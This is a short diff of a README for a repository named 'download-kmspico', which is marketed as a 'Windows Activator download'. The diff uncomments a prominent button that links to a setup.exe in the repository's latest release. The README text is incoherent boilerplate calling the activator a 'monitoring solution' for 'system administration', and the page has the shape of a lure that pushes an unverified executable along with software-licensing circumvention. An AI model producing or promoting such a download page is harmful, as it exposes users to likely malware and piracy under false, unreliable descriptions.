@@ -4,13 +4,13 @@ Here is a draft README.md for the **Windows Activator download** application wit
 
 **download-kmspico** is an advanced **Windows Activator download** and monitoring solution providing comprehensive management capabilities through automated workflows. This latest version combines reliability, customization, and ease-of-use for optimal system administration.
 
-<!-- 
+
 <div align="center">
   <a href="https://github.com/download2025/download-kmspico/releases/latest/download/setup.exe">
     <img src=".github/assets/images/readme/common/buttons/5.webp" alt="Download Button" width="240">
   </a>
 </div>
--->
+
 
 ## Key Features
 
